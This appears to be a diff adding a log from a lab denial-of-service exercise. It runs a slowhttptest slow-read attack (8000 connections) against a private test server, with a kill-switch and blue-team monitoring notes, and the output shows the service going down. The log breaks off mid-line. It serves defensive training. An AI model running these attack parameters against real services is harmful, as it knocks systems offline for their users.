@@ -1,0 +1,177 @@
+[*] ENDPOINT: /assets/index-0I-lJHfX.js
+[*] Controlled L7 DoS: http://172.16.147.10:8080/assets/index-0I-lJHfX.js for 60s
+[*] SYN flood (L4) vector: off
+[*] Started: 2026-10-20T09:49:35Z   Logs: /home/alin/Dev/Perso/workshop/attacks/logs/dos-20261020-114935
+[*] Blue team: watch Grafana (p95 latency, 5xx, probe_success), Prometheus req/s, Loki.
+[*] Kill-switch: pkill -f slowhttptest; pkill -f hping3
+[*] Primary (L7): slowhttptest slow-READ (-X) -c 8000 -r 500 -> /assets/index-0I-lJHfX.js
+Tue Oct 20 11:49:35 2026:[H[2JTue Oct 20 11:49:35 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                       SLOW READ
+[0;34mnumber of connections:[1;34m           8000
+[0;34mURL:[1;34m                             http://172.16.147.10:8080/assets/index-0I-lJHfX.js
+[0;34mverb:[1;34m                            GET
+[0;34mcookie:[1;34m                           
+[0;34mheader:[1;34m                           
+[0;34mreceive window range:[1;34m            10 - 20
+[0;34mpipeline factor:[1;34m                 3
+[0;34mread rate from receive buffer:[1;34m   32 bytes / 5 sec
+[0;34mconnections per seconds:[1;34m         500
+[0;34mprobe connection timeout:[1;34m        5 seconds
+[0;34mtest duration:[1;34m                   240 seconds
+[0;34musing proxy:[1;34m                     no proxy 
+
+[0mTue Oct 20 11:49:35 2026:[1;32m
+slow HTTP test status on [0;32m0[1;32mth second:
+
+[1;32minitializing:[1;32m        0
+[1;32mpending:     [1;32m        1
+[1;32mconnected:   [1;32m        0
+[1;32merror:       [1;32m        0
+[1;32mclosed:      [1;32m        0
+[1;32mservice available:[1;32m   [1;32mYES[0m
+[0mTue Oct 20 11:49:40 2026:[H[2JTue Oct 20 11:49:40 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                       SLOW READ
+[0;34mnumber of connections:[1;34m           8000
+[0;34mURL:[1;34m                             http://172.16.147.10:8080/assets/index-0I-lJHfX.js
+[0;34mverb:[1;34m                            GET
+[0;34mcookie:[1;34m                           
+[0;34mheader:[1;34m                           
+[0;34mreceive window range:[1;34m            10 - 20
+[0;34mpipeline factor:[1;34m                 3
+[0;34mread rate from receive buffer:[1;34m   32 bytes / 5 sec
+[0;34mconnections per seconds:[1;34m         500
+[0;34mprobe connection timeout:[1;34m        5 seconds
+[0;34mtest duration:[1;34m                   240 seconds
+[0;34musing proxy:[1;34m                     no proxy 
+
+[0mTue Oct 20 11:49:40 2026:[1;32m
+slow HTTP test status on [0;32m5[1;32mth second:
+
+[1;32minitializing:[1;32m        0
+[1;32mpending:     [1;32m        5
+[1;32mconnected:   [1;32m        2010
+[1;32merror:       [1;32m        0
+[1;32mclosed:      [1;32m        0
+[1;32mservice available:[1;32m   [1;32mYES[0m
+[1;32mreceive window:[1;32m      13 requested, 2304 granted
+[1;31m  WARNING: kernel granted 177x the request; -w/-y are not in force
+[0mTue Oct 20 11:49:45 2026:[H[2JTue Oct 20 11:49:45 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                       SLOW READ
+[0;34mnumber of connections:[1;34m           8000
+[0;34mURL:[1;34m                             http://172.16.147.10:8080/assets/index-0I-lJHfX.js
+[0;34mverb:[1;34m                            GET
+[0;34mcookie:[1;34m                           
+[0;34mheader:[1;34m                           
+[0;34mreceive window range:[1;34m            10 - 20
+[0;34mpipeline factor:[1;34m                 3
+[0;34mread rate from receive buffer:[1;34m   32 bytes / 5 sec
+[0;34mconnections per seconds:[1;34m         500
+[0;34mprobe connection timeout:[1;34m        5 seconds
+[0;34mtest duration:[1;34m                   240 seconds
+[0;34musing proxy:[1;34m                     no proxy 
+
+[0mTue Oct 20 11:49:45 2026:[1;32m
+slow HTTP test status on [0;32m10[1;32mth second:
+
+[1;32minitializing:[1;32m        0
+[1;32mpending:     [1;32m        250
+[1;32mconnected:   [1;32m        3529
+[1;32merror:       [1;32m        0
+[1;32mclosed:      [1;32m        31
+[1;32mservice available:[1;32m   [1;32mYES[0m
+[1;32mreceive window:[1;32m      13 requested, 2304 granted
+[1;31m  WARNING: kernel granted 177x the request; -w/-y are not in force
+[0mTue Oct 20 11:49:50 2026:[H[2JTue Oct 20 11:49:50 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                       SLOW READ
+[0;34mnumber of connections:[1;34m           8000
+[0;34mURL:[1;34m                             http://172.16.147.10:8080/assets/index-0I-lJHfX.js
+[0;34mverb:[1;34m                            GET
+[0;34mcookie:[1;34m                           
+[0;34mheader:[1;34m                           
+[0;34mreceive window range:[1;34m            10 - 20
+[0;34mpipeline factor:[1;34m                 3
+[0;34mread rate from receive buffer:[1;34m   32 bytes / 5 sec
+[0;34mconnections per seconds:[1;34m         500
+[0;34mprobe connection timeout:[1;34m        5 seconds
+[0;34mtest duration:[1;34m                   240 seconds
+[0;34musing proxy:[1;34m                     no proxy 
+
+[0mTue Oct 20 11:49:50 2026:[1;32m
+slow HTTP test status on [0;32m15[1;32mth second:
+
+[1;32minitializing:[1;32m        0
+[1;32mpending:     [1;32m        2083
+[1;32mconnected:   [1;32m        3584
+[1;32merror:       [1;32m        0
+[1;32mclosed:      [1;32m        31
+[1;32mservice available:[1;32m   [1;31mNO[0m
+[1;32mreceive window:[1;32m      13 requested, 2304 granted
+[1;31m  WARNING: kernel granted 177x the request; -w/-y are not in force
+[0mTue Oct 20 11:49:55 2026:[H[2JTue Oct 20 11:49:55 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                       SLOW READ
+[0;34mnumber of connections:[1;34m           8000
+[0;34mURL:[1;34m                             http://172.16.147.10:8080/assets/index-0I-lJHfX.js
+[0;34mverb:[1;34m                            GET
+[0;34mcookie:[1;34m                           
+[0;34mheader:[1;34m                           
+[0;34mreceive window range:[1;34m            10 - 20
+[0;34mpipeline factor:[1;34m                 3
+[0;34mread rate from receive buffer:[1;34m   32 bytes / 5 sec
+[0;34mconnections per seconds:[1;34m         500
+[0;34mprobe connection timeout:[1;34m        5 seconds
+[0;34mtest duration:[1;34m                   240 seconds
+[0;34musing proxy:[1;34m                     no proxy 
+
+[0mTue Oct 20 11:49:55 2026:[1;32m
+slow HTTP test status on [0;32m20[1;32mth second:
+
+[1;32minitializing:[1;32m        0
+[1;32mpending:     [1;32m        3667
+[1;32mconnected:   [1;32m        3604
+[1;32merror:       [1;32m        0
+[1;32mclosed:      [1;32m        31
+[1;32mservice available:[1;32m   [1;31mNO[0m
+[1;32mreceive window:[1;32m      13 requested, 2304 granted
+[1;31m  WARNING: kernel granted 177x the request; -w/-y are not in force
+[0mTue Oct 20 11:50:01 2026:[H[2JTue Oct 20 11:50:01 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                       SLOW READ
+[0;34mnumber of connections:[1;34m           8000
+[0;34mURL:[1;34m                             http://172.16.147.10:8080/assets/index-0I-lJHfX.js
+[0;34mverb:[1;34m                            GET
+[0;34mcookie:[1;34m                           
+[0;34mheader:[1;34m                           
+[0;34mreceive window range:[1;34m            10 - 20
+[0;34mpipeline factor:[1;34m                 3
+[0;34mread rate from receive buffer:[1;34m   32 bytes / 5 sec
+[0;34mconnections per seconds:[1;34m         500
+[0;34mprobe connection timeout:[1;34m        5 seconds
+[0;34mtest duration:[1;34m                   240 seconds
+[0;34musing proxy:[1;34m                     no proxy 
+
+[0mTue Oct 20 11:50:01 2026:[1;32m
+slow HTTP test status on [0;32m25[1;32mth second:
+
+[1;32minitializing:[1;32m        0
+[1;32mpending:     [1;32m        4219
+[1;32mconnected:   [1;32m        3750
+[1;32merror:       [1;32m        0
+[1;32mclosed:      [1;32m        31
+[1;32mservice available:[1;32m   [1;31mNO[0m
+[1;32mreceive window:[1;32m      13 requested, 2304 granted
+[1;31m  WARNING: kernel granted 177x the request; -w/-y are not in force
+[0mTue Oct 20 11:50:06 2026:[H[2JTue Oct 20 11:50:06 2026:
+	[1;36mslowhttptest version 1.10.0
+ - https://github.com/shekyan/slowhttptest -
+[0;34mtest type:[1;34m                      
